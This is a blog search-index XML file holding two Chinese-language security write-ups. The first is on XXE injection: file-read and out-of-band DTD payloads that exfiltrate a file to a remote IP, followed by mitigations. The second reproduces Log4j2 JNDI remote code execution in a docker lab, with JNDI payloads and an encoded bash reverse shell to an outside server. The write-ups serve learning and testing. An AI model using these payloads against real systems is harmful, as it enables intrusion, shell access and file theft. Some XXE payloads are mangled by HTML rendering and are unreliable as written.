<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2022/04/10/xml-xxe-wu-hui-xian-dtd-shi-ti-wei-xie-yi-dai-ma-shen-ji/"/>
      <url>/2022/04/10/xml-xxe-wu-hui-xian-dtd-shi-ti-wei-xie-yi-dai-ma-shen-ji/</url>
      
        <content type="html"><![CDATA[<h4 id="XML-amp-XXE-amp-无回显-amp-DTD实体-amp-伪协议-amp-代码审计"><a href="#XML-amp-XXE-amp-无回显-amp-DTD实体-amp-伪协议-amp-代码审计" class="headerlink" title="XML&amp;XXE&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计"></a><strong>XML&amp;XXE&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计</strong></h4><p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><p>客户端：xml发送数据</p><p>服务端：xml解析数据</p><p>利用xml写一个带有文件读取的代码尝试发送，类似文件读取功能实现</p><p>无回显：要利用带外测试（利用dnslog来做测试！） </p><p>实体引用：引用远程的evil2.dtd文件</p><h5 id="1-解决拦截防护绕过问题"><a href="#1-解决拦截防护绕过问题" class="headerlink" title="1.解决拦截防护绕过问题"></a>1.解决拦截防护绕过问题</h5><!--?xml version="1.0" ?--><p>​    %file;</p><p>]&gt;</p><p><user><username>&amp;send;</username><password>Mikasa</password></user></p><p>evil2.dtd ：该文件读取d:e.txt的内容</p><!--ENTITY send SYSTEM "file:///d:/e.txt"--><h5 id="2-解决数据不回显的问题"><a href="#2-解决数据不回显的问题" class="headerlink" title="2.解决数据不回显的问题"></a>2.解决数据不回显的问题</h5><!--?xml version="1.0"?--><!--ENTITY % remote SYSTEM "http://47.109.33.184/test.dtd"--><p>%remote;</p><p>%all;</p><p>]&gt;</p><p><root>&amp;send;</root></p><p>test.dtd</p><!--ENTITY % all "<!ENTITY send SYSTEM 'http://47.109.33.184/get.php?file=%file;'--><p>“&gt;</p><h5 id="XXE黑盒发现："><a href="#XXE黑盒发现：" class="headerlink" title="XXE黑盒发现："></a>XXE黑盒发现：</h5><p>1、获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试</p><p>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe</p><p>流程：功能分析-前端提交-源码&amp;抓包-构造Paylod测试</p><p>更改请求数据格式：Content-Type</p><h5 id="XXE白盒发现："><a href="#XXE白盒发现：" class="headerlink" title="XXE白盒发现："></a>XXE白盒发现：</h5><p>1、可通过应用功能追踪代码定位审计</p><p>2、可通过脚本特定函数搜索定位审计</p><p>3、可通过伪协议玩法绕过相关修复等</p><h5 id="XXE修复防御方案："><a href="#XXE修复防御方案：" class="headerlink" title="XXE修复防御方案："></a>XXE修复防御方案：</h5><p>-方案1-禁用外部实体</p><p>PHP:</p><p>libxml_disable_entity_loader(true);</p><p>JAVA:</p><p>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</p><p>Python：</p><p>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p><p>-方案2-过滤用户提交的XML数据</p><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/04/05/log4j2-lou-dong-fu-xian/"/>
      <url>/2022/04/05/log4j2-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="log4j2漏洞复现"><a href="#log4j2漏洞复现" class="headerlink" title="log4j2漏洞复现"></a>log4j2漏洞复现</h1><p> 最近的特大漏洞log4j2的出现，也是掀起了安全圈的一个风暴呀，自己也尝试着来复现一下吧，毕竟慢慢成长嘛。</p><p>漏洞描述Apache Log4j 是 Apache 的一个开源项目，Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。该日志框架被大量用于业务系统开发，用来记录日志信息。Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。鉴于此漏洞危害较大，建议客户尽快采取措施防护此漏洞影响版本Apache Log4j 2.x &lt; 2.15.0-rc2</p><p>下面直接开始复现</p><p>现在虚拟机上面拉个Java环境，这样方便嘛</p><p>直接执行代码docker pull vulfocus/log4j2-rce-2021-12-09:latest</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203247.png"></p><p>然后docker images 观看是那个镜像文件，把它跑起来</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203257.png"></p><p>直接docker run -d -P vulfocus/log4j2-rce-2021-12-09  然后看这个跑起来的虚拟机的那个端口号映射到了本虚拟机的端口号docker ps</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203313.png"></p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203320.png"></p><p>然后就直接访问这个网页是否搭建成功 直接访问192.168.227.128：49153   192.168.227.128是我kali虚拟机的ip</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203336.png"></p><p>然后就要先检测这个网页是否纯在log4j2这个漏洞，直接上bp。这里要主要箭头的地方，直接构造的payload要使用自己ceye上的payload=${jndi:ldap://zzz.yqy3cn.ceye.io} 前面的二级域名随便写什么，不写也可以。</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203344.png"></p><p>然后在ceye.io上出现了这个以后，就代表纯在这个log4j2漏洞。</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203356.png"></p><p>现在就到了最刺激的一步了，直接来弹shell吧。。</p><p>首先我们要启动一个idap服务，那就去github（JNDI-Injection-Exploit）上面下载吧。下载完成后在本地执行命令</p><p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMjI2LjY3Lzk5OTkgMD4mMQ}|{base64,-d}|{bash,-i}”-A “xxxxx(执行这个命令的本机ip)”</p><p>当然我这里是在自己的服务器上执行的，都可以看感觉吧 哈哈哈</p><p>先把这个文件提到我的服务器上面去</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203404.png"></p><p>然后直接执行命令哇，但是这里要注意写进去的shell命令要编码喔，否则不行。</p><p>bash -i &gt;&amp; /dev/tcp/120.25.208.59/6363 0&gt;&amp;1 直接反弹到自己的服务区上面去。在<a href="https://www.jackson-t.ca/runtime-exec-payloads.html%E7%BC%96%E7%A0%81%E5%90%8E%E4%B8%BA">https://www.jackson-t.ca/runtime-exec-payloads.html编码后为</a></p><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjUuMjA4LjU5LzYzNjMgMD4mMQ==}|{base64,-d}|{bash,-i}</p><p>然后在服务器上面执行那个命令</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203419.png"></p><p>然后将这个放到bp上面执行，在自己的服务起上面监听6363端口</p><p>payload=${jndi:ldap://baidu.ehlf5h.ceye.io}</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203427.png"></p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203434.png"></p><p>然后就直接拿到shell,完成复现。</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203441.png"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
